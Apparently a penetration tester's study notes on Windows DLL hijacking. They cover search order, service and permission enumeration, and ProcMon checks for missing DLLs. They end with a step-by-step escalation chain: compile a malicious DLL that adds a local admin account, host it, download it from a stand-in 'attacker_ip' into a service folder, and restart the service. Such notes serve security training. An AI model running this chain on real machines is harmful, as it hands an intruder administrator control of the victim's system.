
# DLL Hijacking 

Dynamic Link Libraries (DLL) =  code + resources (icon files, exe, objects)  
- allow developers use + integrate already existing functionality  like `.so` files on linux

Requirements
- service binary is in a writable folder.
- program loads missing DLLs.
- privileged process runs from a non-standard directory 
	- `NT AUTHORITY\SYSTEM` or `Administrator`
- User can restart the service or trigger the application.

## DLL Attack Vectors 

**Attack Vector - DLL Exploitation**

1. Identify interesting third-party services/applications.
2. Check whether the directory is writable.
3. Check loaded or missing DLLs.
4. Confirm whether the process runs with elevated privileges.
5. Trigger restart/execution safely.

**Attack Vector - DLL Search Order Hijacking**

```  
# standard Windows search order
1. The directory from which the application loaded.  
2. The system directory.  
3. The 16-bit system directory.  
4. The Windows directory.  
5. The current directory.  
6. The directories that are listed in the PATH environment variable.  
```  

**Attack Vector - Missing DLL Hijacking**

1. Application attempts to load missing DLL  
2. Windows searches DLL paths  
3. Attacker places malicious DLL in searched writable path  
4. Application loads attacker DLL  
5. Code executes as application user

## Enumeration Workflow

```powershell
# lists installed 32-bit applications -> try to find missing DLLs
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName

# check 64-bit uninstall entries
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName

# enumerate service paths
Get-CimInstance Win32_Service |
Select-Object Name, State, StartMode, StartName, PathName
```

Look for:
- non-Windows paths
- third-party software
- services running as `LocalSystem`
- services in writable directories
- unquoted paths
- services that restart automatically

| Check                 | Command / Method           | Why                                 |
| --------------------- | -------------------------- | ----------------------------------- |
| Service context       | `sc qc service_name`       | Confirms privileged account         |
| Service path          | `sc qc service_name`       | Confirms executable location        |
| Directory permissions | `icacls "C:\Path"`         | Confirms write access               |
| Binary permissions    | `icacls "C:\Path\app.exe"` | Confirms replaceability             |
| Restart ability       | `sc stop` / `sc start`     | Confirms trigger                    |
| Missing DLL           | ProcMon / logs / testing   | Confirms DLL name and path          |
| Architecture          | x86 vs x64                 | DLL must match process architecture |


**e.g. DLL Exploitation**
```powershell
# enumerate service paths
Get-CimInstance Win32_Service |
Select-Object Name, State, StartMode, StartName, PathName

Name      : VendorBackup
State     : Running
StartMode : Auto
StartName : LocalSystem
PathName  : C:\Program Files\Vendor Backup\backup.exe
```
- third-party service
- runs as `LocalSystem`
- starts automatically
- application directory may be worth checking

```powershell
# Check Directory Permissions
icacls "C:\Program Files\Vendor Backup"
icacls "C:\Program Files\Vendor Backup\backup.exe"

C:\Program Files\Vendor Backup BUILTIN\Administrators:(F)  
NT AUTHORITY\SYSTEM:(F)  
BUILTIN\Users:(RX)  
BUILTIN\Users:(W)
```
- low-privileged users can write into the application directory

|Permission|Meaning|
|---|---|
|`F`|Full control|
|`M`|Modify|
|`W`|Write|
|`WD`|Write data / add file|
|`AD`|Append data / add subdirectory|

```cmd
sc stop VendorBackup  
sc start VendorBackup
```

```powershell
Restart-Service VendorBackup
```


**e.g Missing DLL using Procmon**

ProcMon = Microsoft Sysinternals Process Monitor
	GUI-based  
	requires interactive desktop  
	often needs admin rights  
	can be noisy  
	not always practical through a shell

1. `C:\tools\Procmon\ `-> click` Procmon64.exe `-> start Process Monitor as admin/admin_creds
2. filter for `Process name is backup.exe then Include` 
	- `Process Name` = target binary, e.g. `backup.exe`  
	- `Operation` = `CreateFile`  
	- `Path` contains `.dll`  
	- `Result` = `NAME NOT FOUND`
3. clear all current events by click on "Clear" button (red trash button)  
4. click OK

If find `NAME NOT FOUND` + writable path + controlled DLL name + privileged execution/restart path -> missing DLL abuse possible


DLL Execution & Exploitation 

`DllMain` = entry point function running when DLL is loaded or unloaded by process

|Event|Meaning|
|---|---|
|`DLL_PROCESS_ATTACH`|DLL loaded into a process|
|`DLL_THREAD_ATTACH`|New thread created in the process|
|`DLL_THREAD_DETACH`|Thread exits cleanly|
|`DLL_PROCESS_DETACH`|DLL unloaded from the process|

[`dll_injection.cpp`](../../03-tools/scripts/dll_injection.cpp) to add user `kira` : `kira_pw` as local admin 

```bash
# match architecture where possible: 
#64-bit process → 64-bit DLL, 32-bit process → 32-bit DLL.
└─$ x86_64-w64-mingw32-gcc dll_injection.cpp --shared -o missing.dll
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```powershell
iwr -uri http://attacker_ip/missing.dll -OutFile "C:\Program Files\Backup Service\missing.dll"
```

```cmd
:: trigger service
sc stop BackupService  
sc start BackupService

::verify
net user 
net localgroup administrators  
```

